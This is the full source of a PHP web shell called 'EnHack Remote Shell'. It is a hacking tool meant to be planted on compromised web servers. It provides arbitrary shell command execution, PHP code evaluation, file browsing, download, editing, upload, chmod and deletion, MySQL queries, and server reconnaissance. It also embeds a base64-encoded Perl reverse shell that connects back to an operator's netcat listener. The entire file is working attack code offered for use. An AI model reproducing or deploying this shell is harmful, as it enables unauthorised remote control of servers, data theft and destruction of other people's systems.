<?
/****************************************\
|* EnHack Remote Shell - wWw.EnHack.Net *|
|* Developed by EnHack Team             *| 
|* Email: devteam@enhack.net            *|
\****************************************/
//File download
$fdownload=$_GET['fdownload'];
if ($fdownload <> "" ){
	// path & file name
	$path_parts = pathinfo("$fdownload");
	$entrypath=$path_parts["basename"];
	$name = "$fdownload";
	$fp = fopen($name, 'rb');
	header("Content-Disposition: attachment; filename=$entrypath");
	header("Content-Length: " . filesize($name));
	fpassthru($fp);
	exit;
}
//PHP Info
if ($_GET['id'] == "info" ){
	phpinfo();
	exit;
}
?>

<html>
<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>EnHack Remote Shell</title>
<style>
<!--
body {
	font-family: Tahoma; font-size: 8pt; color:#00FF00
}

a {
	text-decoration: none;
}

input {
	BORDER-RIGHT:  #0080FF 1 solid;
	BORDER-TOP:    #0080FF 1 solid;
	BORDER-LEFT:   #0080FF 1 solid;
	BORDER-BOTTOM: #0080FF 1 solid;
	BACKGROUND-COLOR: #333333;
	font: 11pt tahoma;
	color: #ffffff;
}

textarea {
	BORDER-RIGHT:  #ffffff 1 solid;
	BORDER-TOP:    #999999 1 solid;
	BORDER-LEFT:   #999999 1 solid;
	BORDER-BOTTOM: #ffffff 1 solid;
	BACKGROUND-COLOR: #333333;
	font: Fixedsys bold;
	color: #ffffff;
}
-->
</style>
</head>

<body bgcolor="black">
<?
error_reporting(E_ERROR | E_WARNING | E_PARSE);

//File Edit
$fedit=$_GET['fedit'];
if ($fedit <> "" ){
	$fedit=realpath($fedit);
	$lines = file($fedit);
	echo "<center><form action='' method='POST'>";
	echo "<textarea name='savefile' rows=35 cols=100>" ;
	foreach ($lines as $line_num => $line) {
		echo htmlspecialchars($line);
	}

	echo "</textarea><br><br>
	<input type='text' name='filepath'  size='60' value='$fedit'>&nbsp;
	<input type='submit' value=' Save '></form>";
	$savefile=stripslashes($_POST['savefile']);
	$filepath=realpath($_POST['filepath']);

	if ($savefile <> "") {
		$fp=fopen("$filepath","w+");
		fwrite ($fp,"") ;
		fwrite ($fp,$savefile) ;
		fclose($fp);
		echo "<script language='javascript'> close()</script>";
	}
exit();
}

// Change mode
$fchmod=$_GET['fchmod'];
if ($fchmod <> "" ){
	$fchmod=realpath($fchmod);
	echo "<center><font size='3'><br>
	Chang mode $fchmod<br>
	<form method='POST' action=''><br>
	<br>
	<input type='text' name='mode' size='4'>&nbsp;
	<input type='submit' value='chmod'>
	</form><br>";
	$mode=$_POST['mode'];
	if ($mode <> ""){
	chmod ($fchmod , $mode);
	}else {
		echo "Permission denied";
	}
	echo "</font>";
	exit();
}
?>

<div align="center">
	<p align="center">
		<font face=Webdings size=10><b>!</b></font>
		<SPAN style="FILTER: blur(add=1,direction=10,strength=25); HEIGHT: 25px">
		<SPAN style="FONT-SIZE: 23pt; COLOR: #00CCFF; FONT-FAMILY: Impact">&nbsp;EnHack Remote Shell&nbsp;</SPAN></SPAN>
		<font face=Webdings size=10><b>!</b></font>
	</p>
	<table border="1" width="90%" id="table1" style="border: 1px solid #0080FF" cellspacing="0" cellpadding="0" height="600">
		<tr>
			<td style="border: 1px solid #0080FF" valign="top" rowspan="2">
				
				<p align="center"><b>
					<br><a href="?"><img border="0" src="http://img355.imageshack.us/img355/9250/jutomsec3.png"></a>
				</p>
				
				<p align="center">=====[~]=====</p>
				
				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=fm&dir=<?	echo getcwd();	?>	">File Manager</a>
				</font></b></p>
				
				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=cmd">Web Command</a>
				</font></b></p>
				
				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=eval">PHP Evaluator</a>
				</font></b></p>
				
				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=bcon">Back Connect</a>
				</font></b></p>
								
				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=mysql">MySQL Query</a>
				</font></b></p>
				
				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?">Serv Info</a>
				</font></b></p>
								
				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="?id=info" target="_blank">PHP Info</a>
				</font></b></p>
				
				<p align="center">=====[~]=====</p>
				
				<p align="center"><b>
				<font face="Tahoma" size="2" color="#0080FF">
					<a href="mailto:jutoms@enhack.net" alt="Contact">Contact<br><br><img border="0" src="http://enhack.net/enhack.png"></a>
				</font></b></p>
				
			</td>
			<td height="500" width="85%" style="border: 1px solid #0080FF" align="center">
			<?

		//*******************************************************
			//Default
			$id=$_GET['id'];
			if ($id=="") {
				$euserinfo  = @posix_getpwuid(@posix_geteuid());	$egroupinfo = @posix_getgrgid(@posix_getegid());
				echo "<br><a href='http://enhack.net'><img border='0' src='http://img143.imageshack.us/img143/4081/securemt9.png'></a><br>";
				echo "<font color='#DD8008' size='2'><b>OS : ". php_uname();
				echo "<br>IP : <font color='#FF0000'>".$_SERVER['SERVER_ADDR']."</font><br>";
				echo 'uid = '.$euserinfo['uid'].' ( '.$euserinfo['name'].' ) &nbsp;&nbsp;&nbsp;&nbsp; gid = '.$egroupinfo['gid'].' ( '.$egroupinfo['name'].' )<br>';
				echo "</b></font>";
			}

			//Web Command			
			$cmd=$_POST['cmd'];
			if($id=="cmd"){
				$result=ex("$cmd");
				echo "<center><br><h3> Run Command </h3></center>" ;
				echo "<center>
				<form method='POST' action=''>
				<input type='hidden' name='id' value='cmd'>
				<input type='text' size='85' name='cmd' value='$cmd'>&nbsp;
				<input type='submit' value=' Run '>
				</form><br>
				<textarea rows=20 cols=85 >$result</textarea><br><br>";
			}

			//PHP Eval			
			$code=stripslashes($_POST['code']);
			if($id=="eval"){
				echo "<center><br><h3> PHP Code Evaluating </h3></center>" ;
				echo "<center>
				<form method='POST' action=''>
				<input type='hidden' name='id' value='eval'>
				<textarea name ='code' rows=10 cols=85 >$code</textarea><br><br>
				<input type='submit' value=' Evaluate PHP Code'><hr>
				</form>
				<textarea rows=10 cols=85 >";
				eval($code);
				echo "</textarea><br><br>";
			}

			//Working with MySQL			
			$query = stripslashes($_POST['query']);
			if($id == "mysql"){
				$dbhost = $_POST['dbhost']?$_POST['dbhost']:"localhost";
				$dbport = $_POST['dbport']?$_POST['dbport']:"3306";
				$dbuser = $_POST['dbuser'];
				$dbpass = $_POST['dbpass'];
				$dbname = $_POST['dbname'];
				if ($query  == "") { 
					$query  = "-- SHOW DATABASES;\n-- SHOW TABLES FROM <database>;\n-- SHOW COLUMNS FROM <table>;";
				}
				echo "<center><br><h3> Working with MySQL </h3></center>" ;
				echo "<center>
					<form method='POST' action=''>
					<input type='hidden' name='id' value='mysql'>
					DBHost: <input type='text' size='8' name='dbhost' value='$dbhost'>&nbsp;
					DBPort: <input type='text' size='5' name='dbport' value='$dbport'>&nbsp;
					DBUser: <input type='text' size='10' name='dbuser' value='$dbuser'>&nbsp;
					DBPass: <input type='text' size='10' name='dbpass' value='$dbpass'>&nbsp;
					DBName: <input type='text' size='10' name='dbname' value='$dbname'><br><br>
					<textarea name ='query' rows=10 cols=85 >$query</textarea><br><br>
					<input type='submit' name='go' value=' Go '>
					</form>";
					if($_POST['go']) {
						$connect = @mysql_connect($dbhost.":".$dbport, $dbuser, $dbpass);
						if (!$connect)	{ echo '<textarea rows=3 cols=80>Could not connect: ' . mysql_error().'</textarea>';	}
						@mysql_select_db($dbname);
						$result = @mysql_query($query);
						if (!$result)	{ echo '<textarea rows=3 cols=80>Could not query:' . mysql_error().'</textarea>';	}
						$row = @mysql_fetch_row($result);
						@mysql_close($connect);
					}
				echo "<hr>
					<textarea rows=10 cols=85 >";
					print_r($row);
				echo "</textarea><br><br>";
			}

			//Back Connect
			$bc_perl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KaWYgKCEkQVJHVlswXSkgew0KICBwcmludGYgIlVzYWdlOiAkMCBbSG9zdF0gPFBvcnQ+XG4iOw0KICBleGl0KDEpOw0KfQ0KcHJpbnQgIlsqXSBEdW1waW5nIEFyZ3VtZW50c1xuIjsNCiRob3N0ID0gJEFSR1ZbMF07DQokcG9ydCA9IDgwOw0KaWYgKCRBUkdWWzFdKSB7DQogICRwb3J0ID0gJEFSR1ZbMV07DQp9DQpwcmludCAiWypdIENvbm5lY3RpbmcuLi5cbiI7DQokcHJvdG8gPSBnZXRwcm90b2J5bmFtZSgndGNwJykgfHwgZGllKCJVbmtub3duIFByb3RvY29sXG4iKTsNCnNvY2tldChTRVJWRVIsIFBGX0lORVQsIFNPQ0tfU1RSRUFNLCAkcHJvdG8pIHx8IGRpZSAoIlNvY2tldCBFcnJvclxuIik7DQpteSAkdGFyZ2V0ID0gaW5ldF9hdG9uKCRob3N0KTsNCmlmICghY29ubmVjdChTRVJWRVIsIHBhY2sgIlNuQTR4OCIsIDIsICRwb3J0LCAkdGFyZ2V0KSkgew0KICBkaWUoIlVuYWJsZSB0byBDb25uZWN0XG4iKTsNCn0NCnByaW50ICJbKl0gU3Bhd25pbmcgU2hlbGxcbiI7DQppZiAoIWZvcmsoICkpIHsNCiAgb3BlbihTVERJTiwiPiZTRVJWRVIiKTsNCiAgb3BlbihTVERPVVQsIj4mU0VSVkVSIik7DQogIG9wZW4oU1RERVJSLCI+JlNFUlZFUiIpOw0KICBwcmludCAiXG4qKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKlxuKiogICAgIFdlbGNvbWUgVG8gRW5IYWNrIFJlbW90ZSBTaGVsbCAgICAgKipcbioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqXG5cbiI7IA0Kc3lzdGVtKCJ1bnNldCBISVNURklMRTsgdW5zZXQgU0FWRUhJU1QgO2VjaG8gLS09PVN5c3RlbWluZm89PS0tIDsgdW5hbWUgLWE7ZWNobzsNCmVjaG8gLS09PVVzZXJpbmZvPT0tLSA7IGlkO2VjaG87ZWNobyAtLT09RGlyZWN0b3J5PT0tLSA7IHB3ZDtlY2hvOyBlY2hvIC0tPT1TaGVsbD09LS0gIik7IA0KICBleGVjIHsnL2Jpbi9zaCd9ICctYmFzaCcgLiAiXDAiIHggNDsNCiAgZXhpdCgwKTsNCn0=";
			if ($id=="bcon"){
				echo "<center><font size='5'><b> Back Connecting </b></font></center><br><br><br>
				<font color='#DD8008'>Run NetCat on your machine:	</font><i><font color='#FF0000'> nc -l -p 1542</font></i><br><br>
				<hr>
				<form method='POST' action=''><br>
				<font color='#DD8008'>Then input your IP and Port</font><br><br>
				<input type='text' name='pip' value='".$_SERVER['REMOTE_ADDR']."'>
				<input type='text' name='pport' size='5' value='1542'><br><br>
				<input type='submit' value='Connect'>
				</form>";
				$pip=$_POST['pip'];		$pport=$_POST['pport'];
				if ($pip <> "") {
					$fp=fopen('/tmp/bc_perl_enhack.pl', 'w');
					if (!$fp){
						$result = "Error: couldn't write file to open socket connection";
					} else {
						@fputs($fp,@base64_decode($bc_perl));
						fclose($fp);
						$result = ex("perl /tmp/bc_perl_enhack.pl ".$pip." ".$pport." &");
					}
				}
			}

			//File Manager
			$homedir=getcwd();
			$dir=realpath($_GET['dir'])."/";
			if ($id=="fm"){
				echo "<p align='center'><br>
						<form action='' method='GET'>
							<input type='hidden' name='id' value='fm'>
							<input type='text' name='dir' size='80' value='$dir'>&nbsp;
							<input type='submit' value='Dir'>
						</form>
					</p><br>";

				echo "<div align='center'>
				<table border='2' id='table1' style='border: 1px #333333' height='90' cellspacing='0' cellpadding='0'>
					<tr>
						<td height='30' width='250' align='center'><b><font size='2'> File / Folder Name </font></b></td>
						<td height='28' width='65' align='center'><font color='#FFFF00' size='2'><b> Owner </b></font></td>
						<td height='28' width='65' align='center'><font color='#FFFF00' size='2'><b> Group </b></font></td>
						<td height='28' width='65' align='center'><font color='#0080FF' size='2'><b> Size KB </b></font></td>
						<td height='28' width='65' align='center'><font color='#008000' size='2'><b> Download </b></font></td>
						<td height='28' width='50' align='center'><font color='#FF9933' size='2'><b> Edit </b></font></td>
						<td height='28' width='60' align='center'><font color='#999999' size='2'><b> Chmod </b></font></td>
						<td height='28' width='60' align='center'><font color='#FF0000' size='2'><b> Delete </b></font></td>
					</tr>";

		    if (@is_dir($dir)){
				if ($dh=@opendir($dir)){
					while (($file = @readdir($dh)) !== false) {
						$fsize=@round(@filesize($dir . $file)/1024);
						$owner = posix_getpwuid(fileowner($dir . $file));
						$group = posix_getgrgid(filegroup($dir . $file));
						$perms = fileperms($dir . $file);

						if (($perms & 0xC000) == 0xC000) {
							// Socket
							$info = 's';
						} elseif (($perms & 0xA000) == 0xA000) {
							// Symbolic Link
							$info = 'l';
						} elseif (($perms & 0x8000) == 0x8000) {
							// Regular
							$info = '-';
						} elseif (($perms & 0x6000) == 0x6000) {
							// Block special
							$info = 'b';
						} elseif (($perms & 0x4000) == 0x4000) {
							// Directory
							$info = 'd';
						} elseif (($perms & 0x2000) == 0x2000) {
							// Character special
							$info = 'c';
						} elseif (($perms & 0x1000) == 0x1000) {
							// FIFO pipe
							$info = 'p';
						} else {
							// Unknown
							$info = 'u';
						}

						// Owner
						$info .= (($perms & 0x0100) ? 'r' : '-');
						$info .= (($perms & 0x0080) ? 'w' : '-');
						$info .= (($perms & 0x0040) ?
									(($perms & 0x0800) ? 's' : 'x' ) :
									(($perms & 0x0800) ? 'S' : '-'));

						// Group
						$info .= (($perms & 0x0020) ? 'r' : '-');
						$info .= (($perms & 0x0010) ? 'w' : '-');
						$info .= (($perms & 0x0008) ?
									(($perms & 0x0400) ? 's' : 'x' ) :
									(($perms & 0x0400) ? 'S' : '-'));

						// World
						$info .= (($perms & 0x0004) ? 'r' : '-');
						$info .= (($perms & 0x0002) ? 'w' : '-');
						$info .= (($perms & 0x0001) ?
									(($perms & 0x0200) ? 't' : 'x' ) :
									(($perms & 0x0200) ? 'T' : '-'));

						echo "<tr><th width='250' height='22' align='left' nowrap>";
							if (@is_dir($dir.$file)){
								echo "<a href='?id=fm&dir=$dir$file'><font size='2' color='#DD8008'>[Dir]&nbsp;$file";
							} else {
								echo "<font size='2' color='#FFFFFF'>&nbsp;$file ";
							}

						echo "</font></a></th>
							<td width='75' align='center' nowrap><font color='#00CCFF' size='2'>";
								echo $owner['name'];
						echo "</font></a></th>
							<td width='75' align='center' nowrap><font color='#00CCFF' size='2'>";
								echo $group['name'];
						echo "</font></a></th>
							<td width='70' align='center' nowrap><font color='#0080FF' size='2'>";
								if (@is_file($dir.$file)){	echo "$fsize";	}
								else {	echo "&nbsp; ";	}
						echo "</font></td>
							<td width='75' align='center' nowrap>";

						if (@is_file($dir.$file)){
							if (@is_readable($dir.$file)){
								echo "<a href='?id=fm&fdownload=$dir$file'><font size='2' color='#008000'>download";	}
							else {
								echo "<font size='1' color='#FF0000'><b>Unreadable</b>";
							}
						} else {	echo "&nbsp;";	}
						
						echo "</a></font></td>
							<td width='50' align='center' nowrap>";

						if (@is_file($dir.$file)){
							if (@is_readable($dir.$file)){
								echo "<a target='_blank' href='?id=fm&fedit=$dir$file'><font color='#FF9933' size='2'>Edit";
							} else {
								echo "<font size='1' color='#FF0000'><b>Unreadable</b>";
							}
						} else {	echo "&nbsp;";	}

						echo "</a></font></td>
							<td width='80' align='center' nowrap>";
							if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
								echo "<font size='1' color='#999999'>N/A";
							} else {
								echo "<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><font size='2' color='#999999'>$info";
							}

						echo "</a></font></td>
							<td width='60'align='center' nowrap><a href='?id=fm&fdelete=$dir$file'><font size='2' color='#FF0000'>Delete</a></font></td>
						</tr>";
					}
					closedir($dh);
				} 
			}

			echo "</table>
				<form enctype='multipart/form-data' action='' method='POST'>
				<input type='hidden' name='MAX_FILE_SIZE' value='300000' /><br>
				File Upload: <input name='userfile' type='file' size='60'/>&nbsp;
				<inpt type='hidden' name='Fupath'  value='$dir'>
				<input type='submit' value='Upload' />
				</form>

				<form action='' method='GET'>
				<br>
				File Download: <input name='fdownload' type='text' size='60'/>&nbsp;
				<input type='submit' value='Download' />
				</form>

				<form method='GET' action=''><br>
				Chmod:
				<input type='text' name='fchmod' size='60'>&nbsp;
				<input type='text' name='mode' size='4'>&nbsp;
				<input type='submit' value='Change'>
				</form>

				<br>
				<b> [~] </b> $homedir <br>

				</div>";
		}

// Execute
function ex($param) {
	$res = '';
	if (!empty($param)){
		if(function_exists('exec'))	{
			@exec($param,$res);
			$res = join("\n",$res);
		}
		elseif(function_exists('shell_exec'))	{
			$res = @shell_exec($param);
		}
		elseif(function_exists('system'))	{
			@ob_start();
			@system($param);
			$res = @ob_get_contents();
			@ob_end_clean();
		}
		elseif(function_exists('passthru'))	{
			@ob_start();
			@passthru($param);
			$res = @ob_get_contents();
			@ob_end_clean();
		}
		elseif(@is_resource($f = @popen($param,"r")))	{
			$res = "";
			while(!@feof($f)) { $res .= @fread($f,1024); }
			@pclose($f);
		}
	}
	return $res;
}

//Upload Files 
$rpath=$_GET['dir'];
if ($rpath <> "") {
	$uploadfile = $rpath."/" . $_FILES['userfile']['name'];
	print "<pre>";
	if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
	echo "<script language='javascript'> alert('\:D Successfully uploaded.!')</script>";
	echo "<script language='javascript'> history.back(2)</script>";
	}
}

//Delete file
$frpath=$_GET['fdelete'];
if ($frpath <> "") {
	if (is_dir($frpath)){
	$matches = glob($frpath . '/*.*');
		if ( is_array ( $matches ) ) {
			foreach ( $matches as $filename) {
				unlink ($filename);
				rmdir("$frpath");
				echo "<script language='javascript'> alert('Done! Please refresh')</script>";
				echo "<script language='javascript'> history.back(1)</script>";
			}
		}
	} else {
		echo "<script language='javascript'> alert('Done! Please refresh')</script>";
		unlink ("$frpath");
		echo "<script language='javascript'> history.back(1)</script>";
		exit(0);
	}
}
?>
			</td>
		</tr>
		<tr>
			<td style="border: 1px solid #0080FF">
			<p align="center">
			<font color="#FF0000" size="2"><b>[ Copyright � 2008 - <a href="mailto:devteam@enhack.net">Developed</a> by <a href="http://www.enhack.net">EnHack Team</a> ]<br>
:::::::::::::::: [ :: Entertainment and Ethical Hacking :: ] :::::::::::::::: </b></font>
			</p></td>
		</tr>
	</table>
</div>
</font>
</body>
</html>